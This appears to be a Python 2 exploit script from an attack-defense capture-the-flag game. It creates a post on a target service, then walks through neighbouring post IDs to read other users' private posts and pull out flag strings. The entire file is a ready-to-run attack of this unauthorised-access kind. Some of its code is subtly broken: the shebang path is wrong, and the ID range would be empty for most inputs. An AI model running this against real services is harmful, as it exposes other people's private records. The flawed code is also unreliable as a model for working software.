#!/bin/usr/env python

import sys
import requests
import re
import json


flagre = re.compile('[a-zA-Z0-9]{31}=')


def main(argc, argv):
    addr = argv[1]
    port = 17649

    h = {'Content-type': 'application/json'}

    resp = requests.post('http://%s:%d/store' % (addr, port), headers=h, data=json.dumps({'title': 'qwe', 'content': 'hacking alert', 'public': 0, 'token': 'token'}))
    rj = json.loads(resp.text)
    last_pid = int(rj['data']['post_id'])

    start = last_pid
    end = last_pid + 25 if last_pid < 25 else 0
    acc = str()
    for i in xrange(start, end):
        ir = requests.get('http://%s:%d/get' % (addr, port), headers=h, data=json.dumps({'post_id': str(i)}))
        print ir.text
        acc+= json.loads(ir.text)['data']['content']

    flags = flagre.findall(acc)
    for i in flags:
        print i

if __name__ == '__main__':
    sys.exit(main(len(sys.argv), sys.argv))

